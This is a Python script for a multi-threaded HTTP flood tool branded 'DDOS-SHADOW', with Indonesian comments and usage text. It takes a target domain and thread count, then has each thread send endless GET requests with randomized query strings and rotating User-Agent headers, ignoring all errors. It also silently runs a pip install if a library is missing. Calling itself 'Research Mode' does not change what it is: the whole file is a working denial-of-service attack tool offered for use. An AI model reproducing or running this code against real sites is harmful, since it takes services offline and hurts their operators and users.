import os
import sys
import time
import socket
import threading
import http.client
import urllib.parse
from random import choice, randint, randrange
from argparse import ArgumentParser, RawTextHelpFormatter

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    os.system('pip install colorama')
    from colorama import Fore, Style, init

def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""
{Fore.RED}{Style.BRIGHT} ██████╗ ██████╗  ██████╗ ███████╗
 ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
 ██║  ██║██║  ██║██║   ██║███████╗
 ██║  ██║██║  ██║██║   ██║╚════██║
 ██████╔╝██████╔╝╚██████╔╝███████║
 ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
{Fore.YELLOW}     [ Shadow Engine - Research Mode ]
{Fore.CYAN}-----------------------------------------------{Style.RESET_ALL}
"""
    print(banner)

def get_ua():
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
    ]

class ShadowFlood:
    def __init__(self, target, threads):
        self.target = target
        self.threads = threads
        self.count = 0

    def request_flood(self):
        while True:
            try:
                # Memisahkan domain dari skema jika ada
                parsed = urllib.parse.urlparse(self.target)
                host = parsed.netloc if parsed.netloc else self.target
                port = 443 if parsed.scheme == 'https' else 80
                
                conn = http.client.HTTPSConnection(host) if port == 443 else http.client.HTTPConnection(host)
                conn.request("GET", f"/?q={randint(1, 99999)}", headers={"User-Agent": choice(get_ua())})
                self.count += 1
                print(f"{Fore.GREEN}[+] Sent request {self.count} to {host}", end="\r")
            except:
                pass

def main():
    show_banner()
    parser = ArgumentParser(prog='DDOS-SHADOW', formatter_class=RawTextHelpFormatter)
    parser.add_argument('-d', '--domain', help='Target website (e.g., example.com atau 192.168.1.1)')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Jumlah threads (default: 100)')
    
    args = parser.parse_args()

    if not args.domain:
        print(f"{Fore.YELLOW}Cara Pakai: python3 shadow.py -d target.com -t 500")
        return

    print(f"{Fore.BLUE}[*] Memulai serangan ke: {Fore.WHITE}{args.domain}")
    print(f"{Fore.BLUE}[*] Menggunakan {args.threads} threads... Tekan Ctrl+C untuk stop.\n")

    attacker = ShadowFlood(args.domain, args.threads)
    for _ in range(args.threads):
        t = threading.Thread(target=attacker.request_flood)
        t.daemon = True
        t.start()

    while True:
        time.sleep(1)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Wlee>.<")